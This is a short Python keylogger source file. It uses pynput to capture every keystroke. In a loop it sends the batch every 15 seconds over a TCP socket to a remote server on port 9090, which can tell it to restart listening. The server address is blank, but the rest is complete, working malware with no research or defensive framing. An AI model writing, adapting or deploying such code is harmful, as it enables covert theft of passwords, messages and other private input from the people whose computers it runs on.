from pynput.keyboard import Listener
import socket
import threading
import time

SERVER = ''
PORT = 9090
listener_active = False
keystrokes = []  # In-memory storage for keystrokes

# SOCKETS
def send_keystrokes(keystrokes_data):
    global listener_active
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((SERVER, PORT))
        start_connection = "Connection started"
        s.sendall(start_connection.encode('utf-8'))

        response = s.recv(1024)
        print(f"Server response: {response.decode('utf-8')}")
        if response.decode('utf-8') == 'restart_listener':
            listener_active = False

        # Convert list of keystrokes to string and send
        keystrokes_str = ''.join(keystrokes_data)
        s.sendall(keystrokes_str.encode('utf-8'))
    print('Keystrokes sent Successfully')

# Keylogger key
def on_press(key):
    global keystrokes
    keystrokes.append(str(key))

# Keylogger
def keyboard_listener():
    with Listener(on_press=on_press) as listener:
        listener.join()

def start_listener():
    global listener_active, keystrokes
    listener_thread = threading.Thread(target=keyboard_listener)
    listener_thread.start()
    listener_active = True

while True:
    if not listener_active:
        start_listener()
        # Wait for a certain amount of time or number of keystrokes
        time.sleep(15)
        send_keystrokes(keystrokes)
        # Clear the in-memory keystrokes after sending
        keystrokes = []
